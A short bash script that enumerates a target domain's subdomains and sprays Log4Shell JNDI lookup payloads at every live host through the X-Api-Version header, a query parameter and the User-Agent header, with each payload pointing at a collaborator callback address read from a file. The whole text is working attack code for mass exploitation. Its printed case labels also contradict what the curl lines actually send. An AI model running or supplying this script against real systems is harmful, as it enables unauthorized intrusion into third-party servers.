while read -r collaborator_link; do
    subfinder -d domain.com -silent | httprobe | while read url; do 
        case1=$(curl -s "$url" -H "X-Api-Version: \${jndi:$collaborator_link}")
        case2=$(curl -s "$url/?test=\${jndi:$collaborator_link}")
        case3=$(curl -s "$url" -H "User-Agent: \${jndi:$collaborator_link}")
        echo -e "\033[43mDOMAIN => $url\033[0m\n Case1=> X-Api-Version: running-Ldap-payload\n Case2=> Useragent: running-Ldap-payload\n Case3=> $url/?test=running-Ldap-payload\n"
    done
done < collaborator_links.txt
